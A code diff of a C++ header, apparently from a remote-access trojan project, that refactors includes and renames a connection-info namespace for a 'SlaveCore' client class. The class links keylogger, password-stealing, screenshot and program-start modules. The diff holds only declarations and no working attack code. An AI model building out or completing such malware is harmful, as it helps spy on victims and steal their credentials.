@@ -1,13 +1,16 @@
 #pragma once
 
 #include <common/NonCopyable.hpp>
+#include <common/Innocence.hpp>
+
 #include <blaspheme/transfer/FileTransfer.hpp>
 #include <blaspheme/protocol/Authentication.hpp>
-#include <Innocence.hpp>
+
 #include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/Screenshot.hpp>
 #include <malicious/ProgramStart.hpp>
+
 #include "CommandDispatcher.hpp"
 
 namespace Inhibition
@@ -16,7 +19,7 @@ namespace Inhibition
     {
         public:
 
-            SlaveCore(Innocence::ConnectionInfo info);
+            SlaveCore(Common::ConnectionInfo info);
 			~SlaveCore();
 			void exit();
             bool connect();
@@ -28,8 +31,8 @@ namespace Inhibition
             void upgrade();
             const std::string& getInstallPath();
 
-			const Innocence::ConnectionInfo& getConnection() const;
-            void setConnection(const Innocence::ConnectionInfo& info);
+			const Common::ConnectionInfo& getConnection() const;
+            void setConnection(const Common::ConnectionInfo& info);
 			Blaspheme::Session& getSession();
 
         private:
